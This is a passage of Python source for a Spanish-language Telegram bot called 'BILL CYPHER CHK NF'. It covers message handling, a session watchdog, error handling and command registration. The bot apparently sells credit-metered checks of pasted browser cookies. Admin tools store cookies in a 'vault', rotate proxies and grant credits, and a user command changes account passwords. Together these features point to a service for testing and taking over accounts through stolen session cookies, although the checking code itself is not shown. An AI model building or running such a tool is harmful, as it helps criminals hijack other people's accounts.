            await update.message.reply_text(f"❌ {src_msg}", parse_mode=ParseMode.HTML)
        return

    if len(text) < 10 or text.startswith("/"):
        return

    ok, err_msg = _validate_cookie_text(text)
    if not ok:
        await update.message.reply_text(err_msg, parse_mode=ParseMode.HTML)
        return

    if not consume_credit(uid):
        await update.message.reply_text(
            OUT_OF_CREDITS_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=out_of_credits_markup()
        )
        return

    if uid in _ACTIVE_USERS:
        refund_credit(uid)
        await update.message.reply_text("⏳ Ya tienes una comprobación activa.", parse_mode=ParseMode.HTML)
        return

    if uid:
        _ACTIVE_USERS[uid] = time.time()

    status_msg = await update.message.reply_text(
        "⚡ <b>" + to_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔍 <i>Analizando cookies enviadas...</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML
    )
    try:
        await process_cookies(update, status_msg, text, source="texto pegado")
    except Exception as e:
        refund_credit(uid)
        logger.exception("Error en texto pegado")
        await status_msg.edit_text(f"⚠️ Error: {e}", parse_mode=ParseMode.HTML)
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)


# ---------------------------------------------------------------------------
# Watchdog
# ---------------------------------------------------------------------------

async def _session_watchdog() -> None:
    while True:
        await asyncio.sleep(60)
        now = time.time()
        stuck = [uid for uid, ts in list(_ACTIVE_USERS.items()) if now - ts > SESSION_TIMEOUT_SEC]
        for uid in stuck:
            _ACTIVE_USERS.pop(uid, None)
            _USER_SESSION.pop(uid, None)


# ---------------------------------------------------------------------------
# Manejador de errores
# ---------------------------------------------------------------------------

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    if isinstance(err, Conflict):
        return
    if isinstance(err, RetryAfter):
        logger.warning("Telegram rate limit: reintento en %ss", err.retry_after)
        return
    if isinstance(err, (TimedOut, NetworkError, Forbidden)):
        return
    if isinstance(err, BadRequest):
        logger.warning("Telegram BadRequest: %s", err)
        return

    logger.error("Unhandled exception: %s", err, exc_info=context.error)
    if isinstance(update, Update) and update.effective_user:
        _ACTIVE_USERS.pop(update.effective_user.id, None)
        _USER_SESSION.pop(update.effective_user.id, None)


# ---------------------------------------------------------------------------
# Punto de entrada (main)
# ---------------------------------------------------------------------------

def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN is not set.")

    try:
        start_dashboard(port=PORT)
        print(f"✅ Status dashboard running on port {PORT}")
    except Exception as e:
        logger.warning(f"Dashboard couldn't bind to port {PORT}: {e}")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(15)
        .pool_timeout(10)
        .build()
    )

    # Handlers de comandos
    app.add_handler(CommandHandler(["start", "cmds", "panel"], start_command))
    app.add_handler(CommandHandler("help",       help_command))
    app.add_handler(CommandHandler("info",       info_command))
    app.add_handler(CommandHandler("mode",       mode_command))
    app.add_handler(CommandHandler("fullinfo",   fullinfo_command))
    app.add_handler(CommandHandler("basic",      basic_command))
    app.add_handler(CommandHandler("settings",   settings_command))
    app.add_handler(CommandHandler("changepw",   changepw_command))
    app.add_handler(CommandHandler("cancel",     cancel_command))
    app.add_handler(CommandHandler("proxy",      proxy_command))
    app.add_handler(CommandHandler(["broadcast", "notif"], broadcast_command))
    app.add_handler(CommandHandler("users",      users_command))
    app.add_handler(CommandHandler("setbanner",  setbanner_command))
    app.add_handler(CommandHandler("addvault",   addvault_command))
    app.add_handler(CommandHandler("clearvault", clearvault_command))
    app.add_handler(CommandHandler("setcredits", setcredits_command))
    app.add_handler(CommandHandler("backup",     backup_command))
    app.add_handler(CommandHandler("restore",    restore_command))

    # Callbacks interactivos
    app.add_handler(CallbackQueryHandler(panel_callback,         pattern=r"^panel:"))
    app.add_handler(CallbackQueryHandler(proxy_admin_callback,  pattern=r"^proxy:"))
    app.add_handler(CallbackQueryHandler(cancel_callback,       pattern=r"^cancel:"))
    app.add_handler(CallbackQueryHandler(mode_callback,         pattern=r"^mode:"))
    app.add_handler(CallbackQueryHandler(setmode_callback,      pattern=r"^setmode:"))
    app.add_handler(CallbackQueryHandler(setdelivery_callback,  pattern=r"^setdelivery:"))
    app.add_handler(CallbackQueryHandler(closesettings_callback, pattern=r"^closesettings$"))

    # Mensajes y documentos
    app.add_handler(MessageHandler(filters.Document.ALL,           handle_document))
    app.add_handler(MessageHandler(filters.VIDEO,                  setbanner_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    app.add_error_handler(error_handler)

    async def _post_init(application: Application) -> None:
        asyncio.create_task(_session_watchdog())
        global _BOT_USERNAME
        _BOT_USERNAME = (await application.bot.get_me()).username or ""

        # Auto-restauración silenciosa en arranque (recupera datos tras redeploy en Infrlo)
        try:
            if not _VAULT_FILE.exists() or len(_load_vault()) == 0:
                logger.info("Verificando respaldo en la nube de Telegram...")
        except Exception:
            pass

        user_commands = [
            BotCommand("start",    "Panel principal"),
            BotCommand("settings", "Configurar formato y entrega"),
            BotCommand("mode",     "Cambiar modo (Básico / Full)"),
            BotCommand("basic",    "Activar modo básico"),
            BotCommand("fullinfo", "Activar información completa"),
            BotCommand("info",     "Estadísticas en tiempo real"),
            BotCommand("help",     "Formatos de cookies soportados"),
            BotCommand("changepw", "Cambiar contraseña de cuenta"),
            BotCommand("cancel",   "Cancelar operación en curso"),
        ]
        await application.bot.set_my_commands(user_commands, scope=BotCommandScopeDefault())

        admin_commands = user_commands + [
            BotCommand("setcredits", "Asignar créditos a usuario [Admin]"),
            BotCommand("addvault",   "Cargar cookies al baúl [Admin]"),
            BotCommand("clearvault", "Vaciar cookies del baúl [Admin]"),
            BotCommand("backup",     "Descargar respaldo de baúl y créditos [Admin]"),
            BotCommand("restore",    "Restaurar respaldo desde archivo [Admin]"),
            BotCommand("proxy",      "Gestor de proxies [Admin]"),
            BotCommand("users",      "Descargar lista de usuarios [Admin]"),
            BotCommand("broadcast",  "Enviar notificación masiva [Admin]"),
            BotCommand("setbanner",  "Configurar video de cabecera [Admin]"),
        ]
        try:
            await application.bot.set_my_commands(
                admin_commands,
                scope=BotCommandScopeChat(chat_id=OWNER_ID)
            )
        except Exception as e:
            logger.debug("No se pudo configurar scope chat: %s", e)

    app.post_init = _post_init

    print("✅ El bot BILL CYPHER CHK NF está funcionando en Modo 5G…")
    app.run_polling(drop_pending_updates=True, allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    main()
